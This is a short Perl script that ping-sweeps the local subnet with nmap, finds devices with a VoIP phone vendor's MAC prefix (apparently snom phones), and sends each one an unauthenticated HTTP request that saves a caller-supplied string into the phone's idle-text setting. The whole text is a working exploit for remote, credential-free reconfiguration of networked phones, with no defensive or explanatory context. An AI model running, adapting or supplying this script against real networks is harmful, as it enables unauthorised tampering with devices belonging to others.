  use LWP::Simple;

  my $command = shift;
  die "Oops - where's nmap?? \n" unless ( `/usr/bin/which nmap` );
  $_ = `/sbin/ifconfig eth0`;
  /inet addr:*?([\d.]+)/;
  $srchmask = $1;
  $srchmask =~ s/\.\d{1,3}$/\.\*/;
  my @IP = `/usr/bin/nmap -sP $srchmask`;
  my @IPcandidate;
  foreach (@IP) {
    	if ($_ =~ /^MAC Address:\s([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})/ ) {
               	if ($1 eq "00:04:13") {
               		push (@IPcandidate, $_);;
                }
        }
        push (@IPcandidate, $_)
	        if ($_ =~ /^Host/);
  }
  for(my $counter = 0; $counter < $#IPcandidate; ++$counter) {
        if ( @IPcandidate[$counter] =~ /^Host/) {
		if (@IPcandidate[$counter] =~ /(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})/) {
			$hostip = $1;
                        if ( @IPcandidate[$counter+1] =~ /^MAC Address/ ) {
#				print "FOUND SNOM AT $hostip \n";
                                my $content = get 'http://'.$hostip.'/dummy.htm?settings=save&user_idle_text1='.$command;
                                die "Couldn't issue url" unless defined $content;
                        }
		}
	}
  }
